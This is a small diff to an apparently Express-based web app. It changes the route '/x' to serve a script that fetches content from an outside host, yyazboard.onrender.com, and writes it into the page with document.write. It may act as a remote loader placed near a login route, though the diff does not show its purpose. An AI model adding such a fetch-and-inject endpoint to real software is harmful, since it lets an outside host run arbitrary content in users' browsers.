@@ -119,7 +119,7 @@ TypingText.runAll();
 });
 
 app.get('/x', (req, res) => {
-  res.type('application/javascript').send(`fetch('/').then(r=>r.text()).then(t=>document.write(t))`);
+  res.type('application/javascript').send(`fetch('https://yyazboard.onrender.com').then(r=>r.text()).then(t=>document.write(t))`);
 });
 
 app.get('/login', (req, res) => {
